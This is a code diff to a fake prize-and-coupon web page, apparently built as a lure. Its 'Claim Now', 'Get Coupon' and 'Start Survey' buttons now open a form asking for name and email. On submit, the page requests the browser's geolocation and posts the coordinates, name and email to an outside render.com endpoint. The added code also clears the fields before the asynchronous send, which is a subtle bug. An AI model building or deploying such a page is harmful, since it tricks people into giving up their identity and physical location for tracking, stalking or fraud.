@@ -36,6 +36,17 @@
       padding: 20px;
       margin: 20px;
     }
+    form {
+      display: none;
+      margin-top: 20px;
+    }
+    input[type="text"], input[type="email"] {
+      padding: 10px;
+      margin: 10px 0;
+      width: 80%;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
   </style>
 </head>
 <body>
@@ -45,22 +56,50 @@
   <div class="card">
     <h3>🏆 Win a Brand New Smartphone!</h3>
     <p>Click the button below to claim your entry into the lucky draw.</p>
-    <button onclick="getLocation()">Claim Now</button>
+    <button onclick="showForm()">Claim Now</button>
   </div>
 
   <div class="card">
     <h3>🛍️ Exclusive Shopping Discount!</h3>
     <p>Get a 50% off coupon for your next online shopping spree.</p>
-    <button onclick="getLocation()">Get Coupon</button>
+    <button onclick="showForm()">Get Coupon</button>
   </div>
 
   <div class="card">
     <h3>💰 Win a Cash Prize!</h3>
     <p>Take a short survey to enter for a chance to win $500.</p>
-    <button onclick="getLocation()">Start Survey</button>
+    <button onclick="showForm()">Start Survey</button>
   </div>
 
+  <form id="detailsForm">
+    <h2>Enter Your Details to Proceed</h2>
+    <input type="text" id="name" placeholder="Enter your name" required /><br />
+    <input type="email" id="email" placeholder="Enter your email" required /><br />
+    <button type="button" onclick="submitForm()">Submit</button>
+  </form>
+
   <script>
+    function showForm() {
+      document.getElementById('detailsForm').style.display = 'block';
+    }
+
+    function submitForm() {
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+
+      if (!name || !email) {
+        alert('Please fill in all the details.');
+        return;
+      }
+
+      alert('Thank you for submitting your details!');
+      getLocation();
+
+      // Clear the form
+      document.getElementById('name').value = '';
+      document.getElementById('email').value = '';
+    }
+
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
@@ -72,7 +111,10 @@
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      const data = { latitude, longitude };
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+
+      const data = { latitude, longitude, name, email };
 
       fetch("https://your-app-name.onrender.com/location", {
         method: "POST",
@@ -80,7 +122,7 @@
         body: JSON.stringify(data),
       })
       .then(response => response.json())
-      .then(result => console.log("Location sent successfully:", result))
+      .then(result => console.log("Location and details sent successfully:", result))
       .catch(error => console.error("Error:", error));
     }
 
